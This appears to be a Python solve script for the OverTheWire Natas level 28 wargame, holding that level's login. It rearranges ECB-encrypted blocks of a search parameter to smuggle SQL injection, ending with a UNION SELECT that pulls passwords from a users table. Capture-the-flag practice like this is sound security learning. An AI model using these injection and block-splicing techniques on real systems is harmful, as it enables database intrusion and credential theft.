import requests
from urllib.parse import urlparse, parse_qs, quote
import base64
import string

url = "http://natas28.natas.labs.overthewire.org"
auth = ("natas28", "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj")
data = {
    "query" : "a"
}

session =  requests.Session()
session.auth = auth


prefix = "G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP"
dummyblock = "ItlMM3qTizkRB5P2zYxJsb"
badblock = "IWJ2pwLjKxd0ddiQ3a1c5l"

target_url_head = "http://natas28.natas.labs.overthewire.org/search.php/?query="



def run_query_in_url(query):
    data["query"] = query
    response = session.post(url, data = data)
    param = (parse_qs(urlparse(response.url).query))["query"][0]

    tail = param[len(prefix) + len(badblock)::]
    newparam = prefix + dummyblock + tail 
    print(newparam,"\n")

    target_url = target_url_head + quote(newparam)

    print(target_url)

    res = session.get(target_url)
    print(res.text)



#----------------------------------------------------------------------------------------------

# # for finding the prefix part of each query param

# for i in string.printable:
#     data["query"] = i
#     response = session.post(url, data = data)
#     print((parse_qs(urlparse(response.url).query))["query"][0])

#------------------------------------------------------------------------------------------------




# # to find the dummy block 

# query = " "*10
# data["query"] = query
# response = session.post(url, data = data)
# print((parse_qs(urlparse(response.url).query))["query"][0])



#-------------------------------------------------------------------------------------------




# to find the bad block 

# query = 9 * "A" + "'"
# data["query"] = query
# response = session.post(url, data = data)
# param = (parse_qs(urlparse(response.url).query))["query"][0]
# badblock = param[len(prefix):len(prefix) + len(dummy)]
# print(badblock)





#-------------------------------------------------------------------------------------

#trying out for basic injection 

# query = "A"*9 + "' OR 1=1 -- "
# run_query_in_url(query)


# -----------------------------------------------------------------------------------------



# finding out the tables' names 

# query = 9 * "A" + "' UNION SELECT table_name FROM information_schema.tables; -- "
# run_query_in_url(query)


# -----------------------------------------------------------------------------------------



# finding out the tables' names 

query = 9 * "A" + "' UNION SELECT password FROM users; -- "
run_query_in_url(query)





